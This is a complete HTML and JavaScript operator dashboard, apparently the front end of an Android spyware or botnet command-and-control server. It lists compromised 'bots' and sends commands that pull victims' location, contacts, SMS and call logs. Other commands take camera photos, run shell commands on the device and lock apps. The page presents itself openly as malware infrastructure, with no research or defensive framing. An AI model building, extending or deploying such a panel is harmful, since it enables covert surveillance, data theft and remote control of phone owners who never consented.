<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0a0e1a 0%, #1a1f2f 100%);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        /* Header */
        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 20px;
        }

        .header h1 {
            font-size: 48px;
            font-weight: 800;
            background: linear-gradient(135deg, #00ff9d, #00b8ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(0,255,157,0.3);
        }

        .header p {
            color: #888;
            font-size: 16px;
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: rgba(26, 31, 47, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid #2a2f3f;
            border-radius: 15px;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: linear-gradient(135deg, #00ff9d, #00b8ff);
        }

        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: #00ff9d;
            margin-bottom: 5px;
        }

        .stat-label {
            color: #888;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        /* Tabs */
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            background: rgba(26, 31, 47, 0.5);
            padding: 5px;
            border-radius: 10px;
            border: 1px solid #2a2f3f;
        }

        .tab {
            flex: 1;
            padding: 12px;
            text-align: center;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            color: #888;
        }

        .tab:hover {
            background: rgba(0, 255, 157, 0.1);
            color: #00ff9d;
        }

        .tab.active {
            background: linear-gradient(135deg, #00ff9d, #00b8ff);
            color: #0a0e1a;
            font-weight: bold;
        }

        /* Command Panel */
        .command-panel {
            background: rgba(26, 31, 47, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid #2a2f3f;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
        }

        .panel-title {
            font-size: 18px;
            margin-bottom: 15px;
            color: #00ff9d;
        }

        .form-group {
            margin-bottom: 15px;
        }

        select, input {
            width: 100%;
            padding: 12px;
            background: #1a1f2f;
            border: 1px solid #2a2f3f;
            border-radius: 8px;
            color: #e0e0e0;
            font-size: 14px;
        }

        select:focus, input:focus {
            outline: none;
            border-color: #00ff9d;
        }

        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn-primary {
            background: linear-gradient(135deg, #00ff9d, #00b8ff);
            color: #0a0e1a;
            width: 100%;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0,255,157,0.3);
        }

        .btn-small {
            padding: 6px 12px;
            font-size: 12px;
            background: #2a2f3f;
            color: #e0e0e0;
        }

        .btn-small:hover {
            background: #3a3f4f;
        }

        .btn-danger {
            background: #ff4d4d;
            color: white;
        }

        /* Bots Grid */
        .bots-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
        }

        .bot-card {
            background: rgba(26, 31, 47, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid #2a2f3f;
            border-radius: 15px;
            padding: 20px;
            transition: all 0.3s;
        }

        .bot-card:hover {
            transform: translateY(-5px);
            border-color: #00ff9d;
            box-shadow: 0 5px 20px rgba(0,255,157,0.2);
        }

        .bot-card.online {
            border-left: 4px solid #00ff9d;
        }

        .bot-card.offline {
            border-left: 4px solid #ff4d4d;
            opacity: 0.7;
        }

        .bot-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .bot-id {
            font-family: monospace;
            font-size: 14px;
            color: #00ff9d;
            background: #0a0e1a;
            padding: 4px 8px;
            border-radius: 4px;
        }

        .bot-status {
            font-size: 12px;
            padding: 4px 8px;
            border-radius: 12px;
            background: rgba(255,255,255,0.1);
        }

        .online .bot-status {
            color: #00ff9d;
        }

        .offline .bot-status {
            color: #ff4d4d;
        }

        .bot-info {
            display: grid;
            grid-template-columns: auto 1fr;
            gap: 10px;
            margin-bottom: 15px;
            font-size: 13px;
            color: #aaa;
        }

        .bot-info .label {
            color: #666;
        }

        .bot-actions {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }

        /* Results Panel */
        .results-panel {
            background: rgba(26, 31, 47, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid #2a2f3f;
            border-radius: 15px;
            padding: 20px;
        }

        .result-item {
            padding: 15px;
            border-bottom: 1px solid #2a2f3f;
            font-size: 13px;
        }

        .result-item:last-child {
            border-bottom: none;
        }

        .result-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            color: #00ff9d;
        }

        .result-data {
            background: #0a0e1a;
            padding: 10px;
            border-radius: 5px;
            color: #e0e0e0;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 200px;
            overflow: auto;
        }

        /* Loading */
        .loading {
            text-align: center;
            padding: 40px;
            color: #888;
        }

        .loading::after {
            content: '';
            display: inline-block;
            width: 20px;
            height: 20px;
            margin-left: 10px;
            border: 2px solid #00ff9d;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>‚ö° C2 CONTROL PANEL</h1>
            <p>Advanced Command & Control Server</p>
        </div>

        <!-- Stats -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="totalBots">0</div>
                <div class="stat-label">Total Bots</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="onlineBots">0</div>
                <div class="stat-label">Online Now</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalCommands">0</div>
                <div class="stat-label">Commands</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="uptime">-</div>
                <div class="stat-label">Uptime</div>
            </div>
        </div>

        <!-- Tabs -->
        <div class="tabs">
            <div class="tab active" onclick="switchTab('bots')">üì± Bots</div>
            <div class="tab" onclick="switchTab('commands')">üìã Commands</div>
            <div class="tab" onclick="switchTab('results')">üìä Results</div>
        </div>

        <!-- Bots Tab -->
        <div id="botsTab">
            <div class="command-panel">
                <div class="panel-title">üì§ Send Command to Bot</div>
                <div class="form-group">
                    <select id="targetBot">
                        <option value="">Select target bot...</option>
                    </select>
                </div>
                <div class="form-group">
                    <select id="commandSelect">
                        <option value="info">üì± Get Device Info</option>
                        <option value="location">üìç Get Location</option>
                        <option value="contacts">üìá Get Contacts</option>
                        <option value="camera">üì∏ Take Photo</option>
                        <option value="sms">üì® Get SMS</option>
                        <option value="calllogs">üìû Get Call Logs</option>
                        <option value="shell">üíª Execute Shell</option>
                        <option value="lock">üîí Lock App</option>
                    </select>
                </div>
                <div class="form-group">
                    <input type="text" id="commandArgs" placeholder="Arguments (optional)">
                </div>
                <button class="btn btn-primary" onclick="sendCommand()">Send Command</button>
            </div>

            <h3 style="margin-bottom: 15px; color: #00ff9d;">ü§ñ Connected Bots</h3>
            <div class="bots-grid" id="botsList">
                <div class="loading">Loading bots...</div>
            </div>
        </div>

        <!-- Commands Tab -->
        <div id="commandsTab" style="display: none;">
            <div class="command-panel">
                <div class="panel-title">üìã Command History</div>
                <div id="commandsList" class="results-panel">
                    <div class="loading">Loading commands...</div>
                </div>
            </div>
        </div>

        <!-- Results Tab -->
        <div id="resultsTab" style="display: none;">
            <div class="command-panel">
                <div class="panel-title">üìä Command Results</div>
                <div id="resultsList" class="results-panel">
                    <div class="loading">Loading results...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // State
        let bots = [];
        let startTime = Date.now();
        let currentTab = 'bots';

        // Switch tabs
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('[id$="Tab"]').forEach(t => t.style.display = 'none');
            
            document.querySelector(`.tab:nth-child(${tab === 'bots' ? 1 : tab === 'commands' ? 2 : 3})`).classList.add('active');
            document.getElementById(tab + 'Tab').style.display = 'block';
            currentTab = tab;
            
            if (tab === 'commands') loadCommands();
            if (tab === 'results') loadResults();
        }

        // Load bots
        async function loadBots() {
            try {
                const res = await fetch('/api/bots');
                bots = await res.json();
                
                updateStats();
                renderBots();
                updateBotSelect();
                
            } catch (error) {
                console.error('Error loading bots:', error);
                document.getElementById('botsList').innerHTML = '<div style="color: #ff4d4d; text-align: center;">Error loading bots</div>';
            }
        }

        // Update stats
        function updateStats() {
            const online = bots.filter(b => b.online).length;
            document.getElementById('totalBots').textContent = bots.length;
            document.getElementById('onlineBots').textContent = online;
            
            const uptime = Math.floor((Date.now() - startTime) / 1000);
            const hours = Math.floor(uptime / 3600);
            const minutes = Math.floor((uptime % 3600) / 60);
            document.getElementById('uptime').textContent = `${hours}h ${minutes}m`;
        }

        // Render bots
        function renderBots() {
            const list = document.getElementById('botsList');
            
            if (bots.length === 0) {
                list.innerHTML = '<div style="text-align: center; padding: 40px; color: #888;">No bots connected yet</div>';
                return;
            }

            list.innerHTML = bots.map(bot => `
                <div class="bot-card ${bot.online ? 'online' : 'offline'}">
                    <div class="bot-header">
                        <span class="bot-id">${bot.id.substring(0, 16)}...</span>
                        <span class="bot-status">${bot.online ? 'üü¢ ONLINE' : 'üî¥ OFFLINE'}</span>
                    </div>
                    <div class="bot-info">
                        <span class="label">üì± Model:</span>
                        <span>${bot.model || 'Unknown'}</span>
                        <span class="label">ü§ñ Android:</span>
                        <span>${bot.android || 'Unknown'} (SDK ${bot.sdk || '?'})</span>
                        <span class="label">üì° Last Seen:</span>
                        <span>${new Date(bot.lastSeen).toLocaleString()}</span>
                    </div>
                    <div class="bot-actions">
                        <button class="btn btn-small" onclick="selectBot('${bot.id}')">Select</button>
                        <button class="btn btn-small" onclick="quickCommand('${bot.id}', 'info')">Info</button>
                        <button class="btn btn-small" onclick="quickCommand('${bot.id}', 'location')">üìç Loc</button>
                        <button class="btn btn-small" onclick="quickCommand('${bot.id}', 'camera')">üì∏ Cam</button>
                        <button class="btn btn-small" onclick="quickCommand('${bot.id}', 'contacts')">üìá Con</button>
                    </div>
                </div>
            `).join('');
        }

        // Update bot select dropdown
        function updateBotSelect() {
            const select = document.getElementById('targetBot');
            select.innerHTML = '<option value="">Select target bot...</option>' + 
                bots.map(bot => `<option value="${bot.id}">${bot.id.substring(0, 16)}... ${bot.online ? 'üü¢' : 'üî¥'}</option>`).join('');
        }

        // Select bot
        function selectBot(id) {
            document.getElementById('targetBot').value = id;
        }

        // Quick command
        async function quickCommand(botId, cmd) {
            const res = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId: botId, command: cmd })
            });
            
            const data = await res.json();
            if (data.success) {
                alert(`‚úÖ Command ${cmd} sent!`);
            } else {
                alert(`‚ùå Failed: ${data.error}`);
            }
        }

        // Send command
        async function sendCommand() {
            const botId = document.getElementById('targetBot').value;
            const command = document.getElementById('commandSelect').value;
            const args = document.getElementById('commandArgs').value;
            
            if (!botId) {
                alert('‚ùå Select a bot first!');
                return;
            }

            const res = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    deviceId: botId, 
                    command,
                    args: { value: args }
                })
            });
            
            const data = await res.json();
            if (data.success) {
                alert(`‚úÖ Command ${command} sent to bot!`);
                document.getElementById('commandArgs').value = '';
            } else {
                alert(`‚ùå Failed: ${data.error}`);
            }
        }

        // Load commands
        async function loadCommands() {
            // Implement if needed
        }

        // Load results
        async function loadResults() {
            // Implement if needed
        }

        // Auto refresh
        setInterval(() => {
            if (currentTab === 'bots') {
                loadBots();
            }
        }, 3000);

        // Initial load
        loadBots();
    </script>
</body>
</html>
